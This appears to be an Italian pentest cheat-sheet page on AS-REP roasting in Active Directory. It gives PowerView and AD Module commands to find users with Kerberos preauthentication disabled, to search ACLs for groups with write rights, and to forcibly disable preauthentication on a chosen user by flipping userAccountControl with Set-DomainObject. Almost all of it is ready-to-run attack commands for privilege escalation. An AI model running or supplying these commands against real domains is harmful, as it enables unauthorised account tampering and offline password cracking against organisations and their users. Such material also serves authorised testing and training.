# Priv Esc - Targeted Kerberoasting - AS-REPs2

#### Enumerazione account con Kerberos Preauth disabilitata

* Power View

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

* Active Directory Module

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

#### Disabilitazione forzata Kerberos Preauth

* Enumerare i permessi degli utenti del gruppo RDPUsers via ACLs utilizzando PowerView:

{% code fullWidth="true" %}
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
{% endcode %}

* &#x20;Modifica dell'Attributo `userAccountControl` (PowerView)

```powershell
Set-DomainObject -Identity <UTENTE> -XOR @{useraccountcontrol=4194304} -Verbose
```

* Verifica che il Kerberos Preauth sia disabilitato

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
